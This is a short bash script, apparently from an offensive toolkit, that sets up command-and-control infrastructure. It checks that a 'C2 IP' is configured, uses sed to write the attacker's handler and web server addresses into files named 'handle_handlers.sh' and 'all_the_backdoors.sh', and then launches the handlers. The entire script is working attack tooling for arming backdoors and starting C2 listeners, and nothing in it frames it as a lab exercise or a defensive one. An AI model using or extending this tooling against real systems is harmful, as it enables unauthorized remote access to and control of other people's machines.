CONFIG_FILE=./config
if [ ! -f "$CONFIG_FILE" ]; then
    echo "Config file does not exists."
    exit 1
fi
source $CONFIG_FILE 
if [ "$HANDLER_IP" == "whynot" ]; then
    echo "you forgot to set the C2 IP please fix that in config"
    exit 1
fi
cd remote
echo "hardcoding web server port and ip and handler ip"
sed -i  "s/WEBSERVER_IP/$WEBSERVER_IP/" ./handle_handlers.sh
sed -i  "s/HANDLER_IP/$HANDLER_IP/" ./handle_handlers.sh
sed -i  "s/WEBSERVER_PORT/$WEBSERVER_PORT/" ./handle_handlers.sh
sed -i  "s/WEBSERVER_IP/$WEBSERVER_IP/" ./all_the_backdoors.sh
sed -i  "s/HANDLER_IP/$HANDLER_IP/" ./all_the_backdoors.sh
sed -i  "s/WEBSERVER_PORT/$WEBSERVER_PORT/" ./all_the_backdoors.sh
echo "starting handlers"
./handle_handlers.sh
